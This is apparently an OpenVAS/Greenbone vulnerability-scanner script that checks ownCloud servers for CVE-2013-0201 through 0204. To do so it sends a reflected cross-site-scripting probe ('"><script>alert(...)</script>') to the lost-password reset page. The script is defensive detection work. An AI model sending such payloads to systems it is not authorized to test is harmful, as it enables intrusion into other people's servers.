# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:owncloud:owncloud";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103645");
  script_cve_id("CVE-2013-0201", "CVE-2013-0202", "CVE-2013-0203", "CVE-2013-0204");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_version("2023-12-01T16:11:30+0000");
  script_name("ownCloud <= 4.0.10, 4.5.x <= 4.5.5 Multiple Vulnerabilities - Active Check");
  script_tag(name:"last_modification", value:"2023-12-01 16:11:30 +0000 (Fri, 01 Dec 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-12-18 19:39:00 +0000 (Wed, 18 Dec 2019)");
  script_tag(name:"creation_date", value:"2013-01-24 11:21:02 +0100 (Thu, 24 Jan 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_owncloud_http_detect.nasl");
  script_mandatory_keys("owncloud/http/detected");
  script_require_ports("Services/www", 443);

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57497");

  script_tag(name:"summary", value:"ownCloud is prone to an arbitrary-code execution vulnerability,
  multiple HTML-injection vulnerabilities and multiple cross-site scripting (XSS) vulnerabilities
  because it fails to properly sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploits will allow attacker-supplied HTML and script
  code to run in the context of the affected browser, potentially allowing the attacker to steal
  cookie-based authentication credentials or control how the site is rendered to the user and to
  execute arbitrary code in the context of the web server. Other attacks are also possible.");

  script_tag(name:"affected", value:"ownCloud versions through 4.0.10 and 4.5.x through 4.5.5.");

  script_tag(name:"solution", value:"Vendor updates are available. Please see the references for
  more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/core/lostpassword/templates/resetpassword.php?l="><script>alert(/vt-xss-test/)</script>&_=1';

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(/vt-xss-test/\)</script>", check_header:TRUE)) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
